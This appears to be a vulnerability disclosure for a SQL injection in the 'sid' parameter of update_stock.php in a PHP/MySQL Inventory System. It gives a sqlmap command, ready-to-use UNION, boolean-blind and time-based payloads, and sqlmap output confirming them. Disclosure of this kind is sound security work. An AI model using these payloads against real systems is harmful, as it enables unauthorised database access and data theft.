# SQL Injection in Inventory System (Update Stock)

## Overview

* **Vulnerability Type**: SQL Injection
* **Product**: [Inventory System](https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html)
* **Version**: 1.0
* **Component**: Update Stock (`update_stock.php`)
* **Vulnerable Parameter**: `sid` (GET)

## Description

A SQL Injection vulnerability exists in the **Inventory System**. The vulnerability is located in the `update_stock.php` file.

The application fails to properly sanitize the `sid` parameter in the HTTP GET request. This allows an authenticated attacker to inject arbitrary SQL commands. Since the backend database is **MySQL** and the injection point allows for **UNION queries**, attackers can directly retrieve and display sensitive data from the database, in addition to using blind injection techniques.

## Steps to Reproduce

1. **Setup**: Deploy the Inventory System locally.
2. **Login**: Log in to the application.
3. **Exploit**: Send a crafted HTTP GET request to `update_stock.php` with the malicious payload, or use `sqlmap`.

**SQLMap Command:**

```bash
sqlmap -u "http://127.0.0.1:8089/update_stock.php?sid=42&table=stock_details&return=view_product.php" \
--batch -v 6 --risk=3 \
--cookie "PHPSESSID=YOUR_COOKIE_HERE"

```

## PoC Payload

**UNION Query Payload (MySQL):**

```sql
sid=-1615 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a786a71,0x4d73476e795353486564424b6c656f43686559656e485161415862494c644148644b4b6259787279,0x71626b7171),NULL,NULL,NULL,NULL-- -&table=stock_details&return=view_product.php

```

**Boolean-based Blind Payload:**

```sql
sid=(SELECT (CASE WHEN (4686=4686) THEN 42 ELSE (SELECT 2665 UNION SELECT 7485) END))&table=stock_details&return=view_product.php

```

**Time-based Blind Payload:**

```sql
sid=42 AND (SELECT 1905 FROM (SELECT(SLEEP(5)))LsbI)&table=stock_details&return=view_product.php

```

## Proof of Concept

The following output from `sqlmap` confirms that the `sid` parameter is vulnerable to UNION-based, Boolean-based, and Time-based SQL injection.

```text
Parameter: sid (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: sid=(SELECT (CASE WHEN (4686=4686) THEN 42 ELSE (SELECT 2665 UNION SELECT 7485) END))&table=stock_details&return=view_product.php
    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: sid=42 AND (SELECT 1905 FROM (SELECT(SLEEP(5)))LsbI)&table=stock_details&return=view_product.php
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])

    Type: UNION query
    Title: Generic UNION query (NULL) - 11 columns
    Payload: sid=-1615 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a786a71,0x4d73476e795353486564424b6c656f43686559656e485161415862494c644148644b4b6259787279,0x71626b7171),NULL,NULL,NULL,NULL-- -&table=stock_details&return=view_product.php
    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL-- -
---
[INFO] the back-end DBMS is MySQL

```
<img width="1066" height="365" alt="图片" src="https://github.com/user-attachments/assets/29cd3fe7-1053-40d6-b698-4e61172b75d6" />



## Impact

This vulnerability allows an attacker to:

1. **Exfiltrate Data**: Directly retrieve and display database content via UNION-based attacks.
2. **Database Enumeration**: Identify tables, columns, and database schema.

## Reference

* [Project Source Code](https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html)
